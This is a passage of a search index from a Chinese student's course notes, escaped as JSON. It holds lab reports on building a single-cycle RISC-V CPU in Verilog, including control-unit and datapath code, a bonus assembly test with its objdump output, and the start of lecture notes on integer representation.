\u6587\u4ef6\uff08\u5373\u4f7f\u7528 Control.v \u548c Control.edf\uff09\u7136\u540e\u901a\u8fc7 Top.\u200csv \u4e2d\u9876\u5c42\u6a21\u5757\u751f\u6210\u6bd4\u7279\u6d41\uff0c\u5199\u5165 FPGA \u5f00\u53d1\u7248\u5373\u53ef\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1\u3002</p> <p>\u901a\u8fc7\u5355\u6b65\u8fd0\u884c\uff0c\u89c2\u5bdf pc\u3001inst\u3001\u5bc4\u5b58\u5668\u503c\u53ef\u4ee5\u786e\u5b9a\u4e0a\u677f\u4e5f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002</p>"},{"location":"cs/system/cs1/lab5-1/#bonus","title":"Bonus","text":"<p>\u6307\u4ee4\u6269\u5c55\u90e8\u5206\u653e\u5230\u4e0b\u4e00\u4e2a lab \u4e2d\u8ddf\u968f\u63a7\u5236\u90e8\u5206\u4e00\u8d77\u5b9e\u73b0\uff0c\u5199\u5728\u4e0b\u4e00\u6b21 lab \u7684\u5b9e\u9a8c\u62a5\u544a\u4e2d\u3002</p>"},{"location":"cs/system/cs1/lab5-2/","title":"\u5355\u5468\u671f CPU \u8bbe\u8ba1","text":"<p> \u7ea6 1334 \u4e2a\u5b57  248 \u884c\u4ee3\u7801  5 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab5-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.27 ~ 2022.06.21\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab5-2/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5b8c\u6210\u63a7\u5236\u5355\u5143\u6a21\u5757\u8bbe\u8ba1</li> <li>\u7ed3\u5408\u6570\u636e\u901a\u8def\uff0c\u642d\u8d77\u5355\u5468\u671f CPU</li> <li>\u4f7f\u7528 lab5-1 \u7684\u4eff\u771f\u4ee3\u7801\u6587\u4ef6\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5</li> <li>\u4f7f\u7528 lab5-1 \u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1</li> <li>bonus\uff1a\u6307\u4ee4\u6269\u5c55<ul> <li>\u5b9e\u73b0 andi ori and or sll</li> <li>\u5b9e\u73b0 xori slli srli srl</li> <li>\u5b9e\u73b0 auipc sltu jalr</li> </ul> </li> </ul>"},{"location":"cs/system/cs1/lab5-2/#_2","title":"\u63a7\u5236\u5355\u5143\u6a21\u5757\u8bbe\u8ba1","text":"<p>\u76f4\u63a5\u4ee5 bonus \u4e3a\u76ee\u6807\u8fdb\u884c\u8bbe\u8ba1\uff0c\u5b8c\u6210\u8fd9 22 \u4e2a\u6307\u4ee4\uff1alw sw bne beq jal lui addi add slt slti andi ori and or sll xori slli srli srl auipc sltu jalr</p>"},{"location":"cs/system/cs1/lab5-2/#_3","title":"\u660e\u786e\u76ee\u6807","text":"<p>\u76ee\u6807\u5373\u7f16\u5199 lab5-1 \u4e2d\u7ed9\u51fa\u7684 Control.v \u4e2d\u7684 Control \u6a21\u5757\u7684\u7f16\u5199\uff0c\u5176\u529f\u80fd\u5c31\u662f\u63a5\u6536\u6307\u4ee4\u5e76\u8bd1\u7801\uff0c\u89e3\u6790\u51fa\u4e00\u7cfb\u5217\u6570\u636e\u901a\u8def\u4e2d\u4f1a\u7528\u5230\u7684\u503c\u3002\u5176\u8f93\u5165\u8f93\u51fa\u90e8\u5206\uff1a <pre><code>module Control (\n    input   [6:0]   op_code,\n    input   [2:0]   funct3,\n    input           funct7_5,\n    output  [1:0]   pc_src,\n    output          reg_write,\n    output          alu_src_b,\n    output  [3:0]   alu_op,\n    output  [1:0]   mem_to_reg,\n    output          mem_write,\n    output          branch,\n    output          b_type,\n    output          auipc;\n);\n</code></pre> \u8f93\u5165\u4e3a RISC-V 32 \u4f4d\u6307\u4ee4\u7684\u4e09\u4e2a\u90e8\u5206\uff0cop_code \u4e3a\u4f4e 7 \u4f4d\u7684\u64cd\u4f5c\u7801\uff0cfunct3 \u4e3a inst[14:12] \u7684\u529f\u80fd\u90e8\u5206\uff0cfunct7_5 \u4e3a funct7 \u7684\u7b2c\u4e94\u4f4d\u4e5f\u5c31\u662f inst[30]</p> <p>\u8f93\u51fa\u4e3a\u8bd1\u7801\u5f97\u5230\u7684\u4e00\u4e9b\u7ed3\u679c\uff1a</p> <ul> <li>pc_src\uff1apc \u6765\u6e90\uff0c00 \u6765\u81ea pc+4\u300101 \u6765\u81ea JALR\u300110 \u6765\u81ea JAL</li> <li>reg_write\uff1a\u662f\u5426\u5199\u5165\u5bc4\u5b58\u5668\u7ec4</li> <li>alu_src_b\uff1aALUsrc\uff0c0 \u8868\u793a ALU \u7684\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6765\u81ea\u5bc4\u5b58\u5668\uff0c1 \u8868\u793a\u6765\u81ea\u7acb\u5373\u6570</li> <li>alu_op\uff1aALU \u8fdb\u884c\u7684\u64cd\u4f5c\u7b26\uff0c\u5728 AluOp.vh \u4e2d\u5b9a\u4e49</li> <li>mem_to_reg\uff1a\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e\u6765\u6e90\uff0c00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU\u300101 \u6765\u81ea\u7acb\u5373\u6570\u300110 \u6765\u81ea pc+4\u300111 \u6765\u81ea data memory</li> <li>mem_write\uff1a\u662f\u5426\u5199\u5165 data memory\uff0c0 \u8868\u793a\u8bfb\uff0c1 \u8868\u793a\u5199</li> <li>branch\uff1a\u6307\u4ee4\u662f\u5426\u662f branch \u5206\u652f\u64cd\u4f5c\uff0c1 \u8868\u793a\u662f\uff0c0 \u4e0d\u662f</li> <li>b_type\uff1a\u5206\u652f\u64cd\u4f5c\u7c7b\u578b\uff0c0 \u8868\u793a bne\u30011 \u8868\u793a beq</li> </ul> <p>\u6b64\u5916\uff0c\u6211\u589e\u52a0\u4e86\u4e00\u4e2a auipc \u7684\u8f93\u51fa\u6765\u663e\u793a\u5f53\u524d\u6307\u4ee4\u662f\u5426\u4e3a auipc\uff0c\u4f7f Datapath \u4e2d\u505a\u7279\u6b8a\u5904\u7406\u3002</p> <p>\u5269\u4f59\u90e8\u5206\u51e0\u4e4e\u4e0e lab5-1 \u4e00\u81f4\uff0c\u53ea\u9700\u8981\u66ff\u6362 Control.v \u6587\u4ef6\u5e76\u505a\u4e00\u4e9b\u76f8\u5e94\u7684\u9002\u914d\u6027\u66f4\u6539\u5373\u53ef\u3002</p>"},{"location":"cs/system/cs1/lab5-2/#_4","title":"\u6307\u4ee4\u5206\u6790","text":"<p>\u5c06\u6240\u9700\u8981\u5b9e\u73b0\u7684 22 \u4e2a\u6307\u4ee4\u6839\u636e opcodes \u5206\u7c7b\uff1a(\u4e0b\u8868\u4e2d ps \u4ee3\u8868 pc_src\uff0crw \u4ee3\u8868 reg_write\uff0cas \u4ee3\u8868 alu_src_b\uff0cop \u4ee3\u8868 alu_op\uff0cmtr \u4ee3\u8868 mem_to_reg\uff0cmw \u4ee3\u8868 mem_write\uff0cb \u4ee3\u8868 branch\uff0cbt \u4ee3\u8868 b_type\uff0c\u7a7a\u683c\u8868\u793a\u4e0d\u9700\u8981\u8003\u8651\uff0c- \u8868\u793a\u5728\u4e0b\u9762\u5199)</p> opcode \u6307\u4ee4 ps rw as op mtr mw b bt auipc 0000011 lw 0 1 1 ADD 11 0 0 0 0100011 sw 0 0 1 ADD 0 1 0 0 0010011 addi slti xori oriandi slli srli 0 1 1 - 0 0 0 0 1100011 bne beq 0 0 0 XOR 0 0 1 - 0 1101111 jal 10 1 10 0 0 0 0110111 lui 0 1 10 0 0 0 0110011 add slt and orsll srl sltu 0 1 0 - 0 0 0 0 0010111 auipc 0 1 1 ADD 0 0 0 1 1100111 jalr 1 1 1 ADD 10 0 0 0 <p>\u5bf9\u4e8e 0010011 \u7684\u4e00\u7cfb\u5217 I \u578b\u6307\u4ee4\uff0c\u9700\u8981\u901a\u8fc7\u5224\u65ad funct3 \u6765\u786e\u5b9a alu_op\u3002\u5bf9\u4e8e 0110011 \u7684\u4e00\u7cfb\u5217 R \u578b\u6307\u4ee4\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 {funct7_5, funct3} \u4f5c\u4e3a alu_op\u3002\u5bf9\u4e8e bne \u548c beq\uff0c\u5176 b_type \u5c31\u662f ~funct3[0]\u3002</p>"},{"location":"cs/system/cs1/lab5-2/#_5","title":"\u63a7\u5236\u5355\u5143\u6a21\u5757\u4ee3\u7801","text":"<p>\u901a\u8fc7\u524d\u9762\u7684\u5206\u6790\uff0c\u53ef\u4ee5\u76f4\u63a5\u5199\u51fa\u63a7\u5236\u5355\u5143\u7684\u4ee3\u7801\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule Control (\n    input       [6:0]   op_code,\n    input       [2:0]   funct3,\n    input               funct7_5,\n    output reg  [1:0]   pc_src,     // 00 pc+4 01 JALR 10 JAL\n    output reg          reg_write,  // 1 \u5199\u5165\u5bc4\u5b58\u5668\n    output reg          alu_src_b,  // 0 \u6765\u81ea\u5bc4\u5b58\u5668 1 \u6765\u81ea\u7acb\u5373\u6570\n    output reg  [3:0]   alu_op,     // ALUop\n    output reg  [1:0]   mem_to_reg, // 00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU 01 \u6765\u81ea\u7acb\u5373\u6570 10 \u6765\u81ea pc+4 11 \u6765\u81ea data memory\n    output reg          mem_write,  // 0 \u8bfb memory\uff0c1 \u5199\n    output reg          branch,     // 1 \u662f branch 0 \u4e0d\u662f\n    output reg          b_type,     // 1 \u662f beq 0 \u662f bne\n    output reg          auipc       // 1 \u662f auipc \u6307\u4ee4\n);\n    `include \"AluOp.vh\"\n    always @(*) begin\n        pc_src      = 0;\n        reg_write   = 0;\n        alu_src_b   = 0;\n        alu_op      = {funct7_5, funct3};\n        mem_to_reg  = 0;\n        mem_write   = 0;\n        branch      = 0;\n        b_type      = 0;\n        auipc       = 0;\n\n        case (op_code)\n            7'b0000011: begin   // lw\n                reg_write = 1;  alu_src_b = 1;  alu_op = ADD;\n                mem_to_reg = 2'b11;\n            end\n            7'b0100011: begin   // sw\n                alu_src_b = 1;  alu_op = ADD;   mem_write = 1;\n            end\n            7'b0010011: begin   // addi slti xori ori andi slli srli \n                reg_write = 1;  alu_src_b = 1;  \n                case (funct3)\n                    3'b000: alu_op = ADD;\n                    3'b010: alu_op = SLT;\n                    3'b100: alu_op = XOR;\n                    3'b110: alu_op = OR;\n                    3'b111: alu_op = AND;\n                    3'b001: alu_op = SLL;\n                    3'b101: begin\n                        if (funct7_5)   alu_op = SRA;\n                        else            alu_op = SRL;\n                    end\n                endcase\n            end\n            7'b1100011: begin   // bne beq\n                alu_op = XOR;   branch = 1; b_type = ~funct3[0];\n            end\n            7'b1101111: begin   // jal\n                pc_src = 2'b10; reg_write = 1;  mem_to_reg = 2'b10;\n            end\n            7'b0110111: begin   // lui\n                reg_write = 1;  mem_to_reg = 2'b01;\n            end\n            7'b0110011: begin   // add slt and or sll srl sltu\n                reg_write = 1;\n            end\n            7'b0010111: begin   // auipc\n                reg_write = 1;  alu_src_b = 1;  alu_op = ADD;\n                auipc = 1;\n            end\n            7'b1100111: begin   // jalr\n                pc_src = 2'b01; reg_write = 1; mem_to_reg = 2'b10;\n                alu_src_b = 1; alu_op = ADD;\n            end\n        endcase\n    end\n\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab5-2/#_6","title":"\u5176\u5b83\u6587\u4ef6\u4e2d\u7684\u4fee\u6539","text":"<p>ImmGen \u6a21\u5757\u5728\u4e0a\u4e00\u6b21 lab \u4e2d\u5c31\u5b9e\u73b0\u4e86\u5bf9\u4e8e\u8fd9 22 \u4e2a\u6307\u4ee4\u7684\u8bc6\u522b\uff0c\u4e0d\u9700\u8981\u66f4\u6539\u3002SCPU \u6a21\u5757\u4e2d\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a wire auipc \u7136\u540e\u8fde\u63a5 Control \u548c Datapath \u7684 auipc \u63a5\u53e3\u5373\u53ef\u3002Core \u6a21\u5757\u53ca\u66f4\u9ad8\u5c42\u7684\u65e0\u9700\u66f4\u6539\u3002</p> <p>\u56e0\u4e3a sll slli srl srli \u8fd9\u4e9b\u79fb\u4f4d\u7684\u6307\u4ee4\u79fb\u7684\u4f4d\u6570\u90fd\u662f\u53d6\u4f4e 5 \u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u6539\u4e00\u4e0b ALU \u7684\u4ee3\u7801\uff0c\u4f7f\u5176\u8fdb\u884c SLL \u548c SRL\uff08\u5305\u62ec SRA\uff09\u65f6\u53d6 b[4:0] \u8fdb\u884c\u8fd0\u7b97\uff0c\u5373\uff1a <pre><code>...\n    ...\n    SLL: res &lt;= a &lt;&lt; b[4:0];\n    ...\n    SRL: res &lt;= a &gt;&gt; b[4:0];\n    SRA: res &lt;= a &gt;&gt;&gt; b[4:0];\n    ...\n...\n</code></pre></p> <p>Datapath \u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u66f4\u6539\uff1a</p> <ul> <li>\u5bf9\u4e8e ALU \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u8fdb\u884c\u4e00\u4e0b\u9009\u62e9\uff0c\u5982\u679c auipc \u4e3a 0 \u5219\u539f\u6837\u9009\u62e9 read_data_1\uff0c\u4e3a 1 \u5219\u9009\u62e9 pc \u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570</li> <li>PC \u7684\u9009\u62e9\u5668\u8f93\u5165\u5bf9 jal \u548c jalr \u8fdb\u884c\u533a\u5206\uff0cjalr \u5bf9\u5e94\u7684\u5730\u5740\uff08\u5373\u56db\u8def\u9009\u62e9\u5668\u7684\u7b2c\u4e8c\u8def\uff09\u4e3a ALU \u7684\u7ed3\u679c\uff0cjal \u548c branch \u5bf9\u5e94\u7684\u5730\u5740\uff08\u4e09\u56db\u8def\uff09\u4ecd\u4e3a pc+imm</li> </ul> <p>\u66f4\u6539\u540e\u7684 Datapath \u6a21\u5757\uff1a <pre><code>`timescale 1ns / 1ps\n\nmodule Datapath(\n    input           clk,\n    input           rst,\n    input   [1:0]   pc_src,\n    input           reg_write,\n    input           alu_src_b,\n    input           branch,\n    input           b_type,\n    input           auipc,\n    input   [3:0]   alu_op,\n    input   [1:0]   mem_to_reg,\n    input   [31:0]  inst_in,\n    input   [31:0]  data_in,  \n    output  [31:0]  addr_out, \n    output  [31:0]  data_out, \n    output  [31:0]  pc_out,\n    input   [4:0]   debug_reg_addr,\n    output  [31:0]  debug_reg\n);\n    reg     [31:0]  pc;\n    wire    [31:0]  pc_next;\n    wire    [31:0]  write_data, read_data_1, read_data_2;\n    wire    [31:0]  alu_data_1, alu_data_2, alu_result;\n    wire            alu_zero;\n    wire    [31:0]  imm;\n    wire    [31:0]  jal_addr, jalr_addr;\n\n    assign pc_out = pc;\n    assign addr_out = alu_result;\n    assign data_out = read_data_2;\n\n    always @(posedge clk or posedge rst) begin\n        if (rst) begin\n            pc &lt;= 32'b0;\n        end\n        else begin\n            pc &lt;= pc_next;\n        end\n    end\n\n    Regs regs (\n        .clk(clk),\n        .rst(rst),\n        .we(reg_write),\n        .read_addr_1(inst_in[19:15]),\n        .read_addr_2(inst_in[24:20]),\n        .write_addr(inst_in[11:7]),\n        .write_data(write_data),\n        .read_data_1(read_data_1),\n        .read_data_2(read_data_2),\n        .debug_reg_addr(debug_reg_addr),\n        .debug_reg(debug_reg)\n    );\n\n    ImmGen immgen (\n        .inst(inst_in),\n        .imm(imm)\n    );\n\n    Mux2x32 mux2x32_1 (\n        .I0(read_data_1),\n        .I1(pc),\n        .s(auipc),\n        .o(alu_data_1)\n    );\n\n    Mux2x32 mux2x32_2 (\n        .I0(read_data_2),\n        .I1(imm),\n        .s(alu_src_b),\n        .o(alu_data_2)\n    );\n\n    ALU alu (\n        .a(alu_data_1),\n        .b(alu_data_2),\n        .alu_op(alu_op),\n        .res(alu_result),\n        .zero(alu_zero)\n    );\n\n    Mux4x32 mux4x32 (\n        .I0(alu_result),\n        .I1(imm),\n        .I2(pc + 4),\n        .I3(data_in),\n        .s(mem_to_reg),\n        .o(write_data)\n    );\n\n    assign jal_addr = pc + imm;\n    assign jalr_addr = alu_result;\n\n    MuxPC mux_pc (\n        .I0(pc + 4),\n        .I1(jalr_addr),\n        .I2(jal_addr),\n        .I3(jal_addr),\n        .s(pc_src),\n        .branch(branch),\n        .b_type(b_type),\n        .alu_res(alu_result),\n        .o(pc_next)\n    );\nendmodule\n</code></pre></p> <p>\u8fd9\u6837\u4fee\u6539\u540e\u6574\u4e2a\u5355\u5468\u671f CPU \u5c31\u5b8c\u6574\u6b63\u786e\u8fde\u63a5\u4e86</p>"},{"location":"cs/system/cs1/lab5-2/#_7","title":"\u4eff\u771f\u6d4b\u8bd5","text":"<p>\u4e0e lab5-1 \u540c\u7406\uff0c\u8f7d\u5165 lab10_all.coe \u6587\u4ef6\uff0c\u9009\u62e9 Core_tb.sv \u4e3a\u76ee\u6807\u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u518d\u901a\u8fc7\u8c03\u6574\u5f97\u5230\u5168\u90e8\u4e2d\u95f4\u53d8\u91cf\uff08\u5bc4\u5b58\u5668\u7ec4\u503c\u3001ALU \u8f93\u5165\u8f93\u51fa\u3001Mux \u8f93\u5165\u8f93\u51fa\u7b49\uff09\u5f97\u5230\u4eff\u771f\u6ce2\u5f62\uff1a </p> <p>\u4ee5\u53ca pc \u548c\u5bc4\u5b58\u5668\u7684\u6ce2\u5f62\u6570\u636e\uff1a </p> <p>\u901a\u8fc7\u4ed4\u7ec6\u5206\u6790\u6bcf\u4e00\u6761\u6c47\u7f16\u6307\u4ee4\u4e0e\u6240\u6709\u503c\u7684\u53d8\u5316\u3001\u5bc4\u5b58\u5668\u7684\u53d8\u5316\u53ef\u4ee5\u770b\u51fa CPU \u6309\u7167\u7ed9\u51fa\u7684\u6307\u4ee4\u6b63\u786e\u8fd0\u884c\u4e86\u3002\u884c\u4e3a\u5747\u4e0e lab5-1 \u4e00\u81f4\u3002</p>"},{"location":"cs/system/cs1/lab5-2/#_8","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u5728 vivado \u4e2d disable \u6389 Control_sim.v \u6587\u4ef6\uff08\u5373\u4f7f\u7528 Control.v \u548c Control.edf\uff09\u7136\u540e\u901a\u8fc7 Top.\u200csv \u4e2d\u9876\u5c42\u6a21\u5757\u751f\u6210\u6bd4\u7279\u6d41\uff0c\u5199\u5165 FPGA \u5f00\u53d1\u7248\u5373\u53ef\u8fdb\u884c\u4e0a\u677f\u9a8c\u8bc1\u3002</p> <p>\u901a\u8fc7\u5355\u6b65\u8fd0\u884c\uff0c\u89c2\u5bdf pc\u3001inst\u3001\u5bc4\u5b58\u5668\u503c\u53ef\u4ee5\u786e\u5b9a\u4e0a\u677f\u4e5f\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\u3002\u884c\u4e3a\u5747\u4e0e lab5-1 \u4e00\u81f4\u3002</p>"},{"location":"cs/system/cs1/lab5-2/#bonus","title":"Bonus","text":"<p>Bonus \u8303\u56f4\u7684\u6307\u4ee4\u5728\u524d\u9762\u8bbe\u8ba1\u63a7\u5236\u5355\u5143\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u8003\u8651\u4e86\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u6d4b\u8bd5\u8fd9\u4e9b\u6307\u4ee4\u5373\u53ef\u3002\u7b80\u5355\u5199\u4e86\u4e00\u4e2a\u5305\u542b\u8fd9\u4e9b\u6307\u4ee4\u7684 RISC-V \u6c47\u7f16\u6587\u4ef6\uff1a <pre><code>.section .text\n.globl _start\n_start:\n    addi    x1,     x0,     123     # x1 = 123    \n    andi    x2,     x1,     456     # x2 = 72\n    ori     x3,     x2,     789     # x3 = 861\n    and     x4,     x3,     x1      # x4 = 89\n    addi    x5,     x0,     234     # x5 = 234\n    or      x5,     x4,     x5      # x5 = 251 (0xfb)\n    sll     x6,     x5,     x2      # x6 = 64256 (0xFB00) \n    xori    x7,     x6,     123     # x7 = 64379 (0xFB7B)\n    slli    x8,     x7,     4       # x8 = 1030064 (0xFB7B0)\n    srli    x9,     x8,     8       # x9 = 4023 (0xFB7)\n    srl     x10,    x8,     x2      # x10 = 4023 (0xFB7)\n    auipc   x11,    0xFFF           # x11 = 0xFFF02C\n    addi    x12,    x0,     -1      # x12 = -1\n    sltu    x12,    x11,    x12     # x12 = 1\n    jalr    x13,    63(x12)         # x13 = 60\n    addi    x14,    x0,     1       # won't exec\nLabel:\n    addi    x15,    x0,     1\n</code></pre> \u4f7f\u7528 riscv32-unknown-linux-gnu-c++ -nostdlib -nostdinc -static -g bonus.s -o bonus.elf -march=rv32i -mabi=ilp32 \u6765\u7f16\u8bd1\u51fa\u6307\u4ee4\u96c6\u5728 RV32I \u8303\u56f4\u5185\u7684 ELF \u6587\u4ef6\uff0c\u518d objdump\uff1a <pre><code>00010074 &lt;_start&gt;:\n   10074:   07b00093    li  ra,123\n   10078:   1c80f113    andi    sp,ra,456\n   1007c:   31516193    ori gp,sp,789\n   10080:   0011f233    and tp,gp,ra\n   10084:   0ea00293    li  t0,234\n   10088:   005262b3    or  t0,tp,t0\n   1008c:   00229333    sll t1,t0,sp\n   10090:   07b34393    xori    t2,t1,123\n   10094:   00439413    slli    s0,t2,0x4\n   10098:   00845493    srli    s1,s0,0x8\n   1009c:   00245533    srl a0,s0,sp\n   100a0:   00fff597    auipc   a1,0xfff\n   100a4:   fff00613    li  a2,-1\n   100a8:   00c5b633    sltu    a2,a1,a2\n   100ac:   03f606e7    jalr    a3,63(a2)\n   100b0:   00100713    li  a4,1\n\n000100b4 &lt;Label&gt;:\n   100b4:   00100793    li  a5,1\n</code></pre> \u5f97\u5230\u673a\u5668\u7801\uff0c\u5373 coe \u6587\u4ef6\u5185\u5bb9\uff1a <pre><code>memory_initialization_radix = 16;\nmemory_initialization_vector = \n07b00093, 1c80f113, 31516193, 0011f233, 0ea00293, 005262b3, 00229333, 07b34393, 00439413, 00845493, 00245533, 00fff597, fff00613, 00c5b633, 03f606e7, 00100713, 00100793;\n</code></pre> \u8f7d\u5165 ROM \u5185\uff0c\u8fdb\u884c\u4eff\u771f\uff0c\u5f97\u5230\u6ce2\u5f62\u4ee5\u53ca\u5bc4\u5b58\u5668\u5185\u5bb9\u53d8\u5316\uff1a  </p> <p>\u901a\u8fc7\u5206\u6790 pc\u3001\u4e2d\u95f4\u503c\u7b49\u4ee5\u53ca\u548c\u6c47\u7f16\u4ee3\u7801\u5b9e\u9645\u6548\u679c\uff08\u6ce8\u91ca\u91cc\u5199\u4e86\uff09\u5bf9\u6bd4\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e9b bonus \u6307\u4ee4\u90fd\u6b63\u5e38\u6267\u884c\u4e86\u3002\u4e0a\u677f\u6d4b\u8bd5\u4e5f\u6ca1\u6709\u95ee\u9898\u3002</p>"},{"location":"cs/system/cs1/lab5-2/#cpu_1","title":"\u9644\uff1a\u5355\u5468\u671f CPU \u8bbe\u8ba1\u56fe","text":"<p>\u5b9e\u9645\u4f7f\u7528\u7684\u5355\u5468\u671f CPU \u8bbe\u8ba1\u56fe\u5982\u4e0b\uff1a </p>"},{"location":"cs/system/cs1/topic1/","title":"\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406","text":"<p> \u7ea6 2163 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>Computer System: A Programmer's Perspective (3rd.) Chapter 2: Representing and Manipulating Information</li> </ul>"},{"location":"cs/system/cs1/topic1/#_2","title":"\u6574\u6570\u8868\u793a\u6cd5","text":""},{"location":"cs/system/cs1/topic1/#_3","title":"\u65e0\u7b26\u53f7\u6574\u578b","text":"<p>\u65e0\u7b26\u53f7\u6574\u578b\u4e00\u822c\u76f4\u63a5\u4f7f\u7528\u5176\u4e8c\u8fdb\u5236\uff08\u539f\u7801\uff09\u6765\u8868 \u6bd4\u5982\u6709\u4e00\u4e2a \\(w\\) \u4f4d\u7684\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\)\uff0c\u5219\u5c06\u5176\u8f6c\u5316\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff1a</p> \\[ B2U_w(\\overrightarrow{x}) = \\sum_{i=0}^{w-1}x_i2^i \\] <p>\u53ef\u4ee5\u77e5\u9053 B2U \u662f\u4e00\u4e2a\u53cc\u5c04</p> <p>\u540c\u65f6\u4e5f\u5bb9\u6613\u77e5\u9053\u65e0\u7b26\u53f7\u6574\u578b\u53ef\u8868\u793a\u7684\u6700\u5927\u503c\u4e3a \\(UMax_{w}=\\displaystyle\\sum_{i=0}^{w-1}2^i=2^w-1\\)</p>"},{"location":"cs/system/cs1/topic1/#_4","title":"\u6709\u7b26\u53f7\u6574\u578b\u8865\u7801\u8868\u793a","text":"<p>\u6700\u5e38\u7528\u7684\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u65b9\u6cd5\u662f\u8865\u7801\uff08Two's-Complement\uff09 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\)\uff0c\u5c06\u5176\u89c6\u4e3a\u8865\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a</p> \\[ B2T_w(\\overrightarrow{x}) = -x_{w-1}2^{w-1} + \\sum_{i=0}^{w-2}x_i2^i \\] <p>\u5b83\u7684\u6700\u9ad8\u4f4d\uff08MSB\uff09\u662f\u7b26\u53f7\u4f4d\uff0c\u5982\u679c\u662f 1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u662f\u6b63\u6570</p> <p>\u5e76\u4e14\u5bf9\u4e8e\u6b63\u6570\uff0c\u5b83\u5bf9\u5e94\u7684\u6bd4\u7279\u5e8f\u5217\u5c31\u662f\u5176\u4e8c\u8fdb\u5236 \u800c\u5bf9\u4e8e\u8d1f\u6570\uff0c\u5219\u4f7f\u7528\u8865\u7801\uff0c\u5373 \\(-x = \\sim x + 1 (x &gt; 0)\\)</p> <p>\u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5b9e\u9645\u4e0a\u5c31\u662f\u6539\u53d8\u4e86 MSB \u7684\u6743\u91cd\uff0c\u4ece \\(2^{w-1}\\) \u6539\u4e3a\u4e86 \\(-2^{w-1}\\)</p> <p>\u540c\u65f6\u4e5f\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8865\u7801\u53ef\u4ee5\u8868\u793a\u7684\u8303\u56f4 \\(TMin_w=-2^{w-1}\\)\uff0c\\(TMax_w=2^{w-1}-1\\)</p>"},{"location":"cs/system/cs1/topic1/#_5","title":"\u6709\u7b26\u53f7\u6574\u578b\u53cd\u7801\u8868\u793a","text":"<p>\u53cd\u7801\uff08Ones' complement\uff09\u4e5f\u662f\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\)\uff0c\u5c06\u5176\u89c6\u4e3a\u53cd\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a</p> \\[ B2O_w(\\overrightarrow{x}) = -x_{w-1}(2^{w-1}-1) + \\sum_{i=0}^{w-2}x_i2^i \\] <p>\u76f8\u8f83\u4e8e\u8865\u7801\uff0c\u5b83\u4eec\u5728\u6b63\u6570\u4e0a\u662f\u4e00\u6837\u7684 \u4f46\u662f\u5bf9\u4e8e\u8d1f\u6570\uff0c\u53cd\u7801\u8868\u793a\u4e0b\u662f \\(-x = \\sim x (x &gt; 0)\\)</p> <p>\u5728\u53e6\u4e00\u4e2a\u89d2\u5ea6\uff0c\u5b83\u7684 MSB \u7684\u6743\u91cd\u662f \\(2^{w-1}-1\\)</p> <p>\u5b83\u7684\u7f3a\u70b9\u662f 0 \u6709\u4e24\u79cd\u8868\u793a\uff0c\u5373 +0 [00...0] \u548c -0 [11...1]</p>"},{"location":"cs/system/cs1/topic1/#_6","title":"\u65e0\u7b26\u53f7\u4e0e\u6709\u7b26\u53f7\u8f6c\u6362","text":"<p>C \u8bed\u8a00\u4e2d\u5f3a\u5236\u8f6c\u6362\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u6574\u578b\u5e76\u4e0d\u6539\u53d8\u6bd4\u7279\u5e8f\u5217\uff0c\u800c\u662f\u6539\u53d8\u8bfb\u53d6\u7684\u65b9\u5f0f 